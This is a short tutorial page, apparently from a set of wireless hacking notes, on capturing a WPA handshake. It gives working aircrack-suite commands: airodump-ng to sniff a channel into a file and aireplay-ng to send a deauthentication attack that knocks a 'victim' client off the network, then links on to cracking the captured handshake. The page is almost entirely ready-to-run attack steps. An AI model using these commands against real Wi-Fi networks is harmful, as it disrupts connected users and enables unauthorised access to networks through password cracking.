# Capture the Handshake
Sniffing the network traffic

```sh
sudo airodump-ng -c <channel> -w wpa_file wlan0mon
# Do not close this window
```

[Make a Deauthentication Attack](../Deauthentication%20Attack.md)

```sh
sudo aireplay-ng -0 1 -c <client_mac> -a <bssid> wlan0mon
# Do not close this window
```

If the victim STA is inside the reachable are of your wireless card, it will forced to rejoin the network and you should be able to get a new 4-way handshake.

[Now we Crack it](./WPA%20Cracking.md)